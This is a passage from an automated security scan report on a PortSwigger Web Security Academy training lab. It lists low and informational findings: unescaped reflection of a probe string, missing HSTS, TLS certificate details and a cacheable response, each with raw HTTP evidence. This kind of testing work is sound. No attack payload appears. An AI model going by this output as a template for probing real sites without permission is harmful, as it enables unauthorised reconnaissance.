                            <img src="/resources/images/rating1.png">
                            $50.18
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/9.jpg">
                            <h3>Fur Babies</h3>
                            <img src="/resources/images/rating2.png">
                            $92.02
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating1.png">
                            $92.44
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/73.jpg">
                            <h3>Beat the Vacation Traffic</h3>
                            <img src="/resources/images/rating4.png">
                            $69.51
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $76.89
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/29.jpg">
                            <h3>Waterproof Tea Bags</h3>
                            <img src="/resources/images/rating1.png">
                            $65.86
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/42.jpg">
                            <h3>Pest Control Umbrella</h3>
                            <img src="/resources/images/rating3.png">
                            $28.31
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/58.jpg">
                            <h3>There is No &apos;I&apos; in Team</h3>
                            <img src="/resources/images/rating2.png">
                            $60.69
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/75.jpg">
                            <h3>Grow Your Own Spy Kit</h3>
                            <img src="/resources/images/rating1.png">
                            $90.96
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating4.png">
                            $62.09
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating1.png">
                            $2.44
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/56.jpg">
                            <h3>More Than Just Birdsong</h3>
                            <img src="/resources/images/rating5.png">
                            $71.65
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/37.jpg">
                            <h3>The Giant Enter Key</h3>
                            <img src="/resources/images/rating4.png">
                            $25.01
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/51.jpg">
                            <h3>Real Life Photoshopping</h3>
                            <img src="/resources/images/rating2.png">
                            $30.87
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating1.png">
                            $44.03
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr6j6wet-3f` — `artifacts/_/ev-mr6j6wet-3f/`

Request:

```http
GET /?message=umbraR3fl3ct7788 HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
connection: close
content-encoding: gzip
content-length: 2779
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <div>umbraR3fl3ct7788
</div>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/52.jpg">
                            <h3>Hydrated Crackers</h3>
                            <img src="/resources/images/rating2.png">
                            $98.34
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating5.png">
                            $45.52
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating4.png">
                            $23.82
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating4.png">
                            $87.83
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $83.15
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating1.png">
                            $50.18
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/9.jpg">
                            <h3>Fur Babies</h3>
                            <img src="/resources/images/rating2.png">
                            $92.02
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating1.png">
                            $92.44
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/73.jpg">
                            <h3>Beat the Vacation Traffic</h3>
                            <img src="/resources/images/rating4.png">
                            $69.51
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $76.89
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/29.jpg">
                            <h3>Waterproof Tea Bags</h3>
                            <img src="/resources/images/rating1.png">
                            $65.86
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/42.jpg">
                            <h3>Pest Control Umbrella</h3>
                            <img src="/resources/images/rating3.png">
                            $28.31
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/58.jpg">
                            <h3>There is No &apos;I&apos; in Team</h3>
                            <img src="/resources/images/rating2.png">
                            $60.69
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/75.jpg">
                            <h3>Grow Your Own Spy Kit</h3>
                            <img src="/resources/images/rating1.png">
                            $90.96
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating4.png">
                            $62.09
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating1.png">
                            $2.44
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/56.jpg">
                            <h3>More Than Just Birdsong</h3>
                            <img src="/resources/images/rating5.png">
                            $71.65
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/37.jpg">
                            <h3>The Giant Enter Key</h3>
                            <img src="/resources/images/rating4.png">
                            $25.01
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/51.jpg">
                            <h3>Real Life Photoshopping</h3>
                            <img src="/resources/images/rating2.png">
                            $30.87
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating1.png">
                            $44.03
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-3"></a>

### 3. [LOW] [burp] Strict transport security not enforced (3 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

(confidence: CERTAIN) [+2 more URL(s): https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/submitSolution, https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/filter] @ https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/product

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr6j5zne-39` — `artifacts/_/ev-mr6j5zne-39/`

Request:

```http
GET /product HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net

GET /product?productId=2 HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 8144

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="product">
                        <h3>Pet Experience Days</h3>
                        <img src="/resources/images/rating5.png">
                        <div id="price">$45.52</div>
                        <img src="/image/productcatalog/products/15.jpg">
                        <label>Description:</label>
                        <p>Give your beloved furry friend their dream birthday. Here at PED, we offer unrivaled entertainment at competitive prices. Starting with our best seller, the Balloon Ride.</p>
<p>A large collection of helium-filled balloons will be attached with a harness to your dog, once we are confident we have enough power for takeoff then it's up, up and away they go. This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.</p>
<p>Your dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health & Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.</p>
<p>You are strongly advised to wear wet weather clothing and carry an umbrella on the day, the dogs can become very excited on this ride and we have little control over where they might hover. Give your best friend the time of its life, book today as all early birds have an added bonus of choosing the colors of the balloons.</p>
                        <div class="is-linkback">
```

<a id="finding-4"></a>

### 4. [INFO] [burp] TLS certificate

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The server presented a valid, trusted TLS certificate. This issue is purely informational.<br><br>The server presented the following certificates:<br><br><h4>Server certificate</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>*.web-security-academy.net, *.2.web-security-academy.net, *.1.web-security-academy.net, *.3.web-security-academy.net, *.2.h1-web-security-academy.net, *.1.h1-web-security-academy.net, *.h1-web-security-academy.net, *.3.h1-web-security-academy.net</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Amazon RSA 2048 M01</td></tr><tr><td><b>Valid from:</b>&nbsp;&nb @ https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr6j5zn5-38` — `artifacts/_/ev-mr6j5zn5-38/`

Request:

```http
GET / HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
```

Response:

```http
HTTP/1.1 0
```

<a id="finding-5"></a>

### 5. [INFO] [burp] Cacheable HTTPS response

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

(confidence: CERTAIN) @ https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/product

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr6j5znk-3a` — `artifacts/_/ev-mr6j5znk-3a/`

Request:

```http
GET /product HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net

GET /product?productId=2 HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 8144

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="product">
                        <h3>Pet Experience Days</h3>
                        <img src="/resources/images/rating5.png">
                        <div id="price">$45.52</div>
                        <img src="/image/productcatalog/products/15.jpg">
                        <label>Description:</label>
                        <p>Give your beloved furry friend their dream birthday. Here at PED, we offer unrivaled entertainment at competitive prices. Starting with our best seller, the Balloon Ride.</p>
<p>A large collection of helium-filled balloons will be attached with a harness to your dog, once we are confident we have enough power for takeoff then it's up, up and away they go. This adventure is heavily weather dependent as strong winds could prove hazardous as all dogs fly unaccompanied.</p>
<p>Your dog will travel at 5 mph with the wind in its face, and I expect its tongue hanging out. Better than a trip in the car with the window open. Health & Safety is of paramount importance to us, should the dog, at any time, veer off course we will instantly start firing at the balloons one by one in order to facilitate their safe descent. This should not be any cause for concern as this is our official landing procedure at the end of the ride, and no fatalities have been recorded.</p>
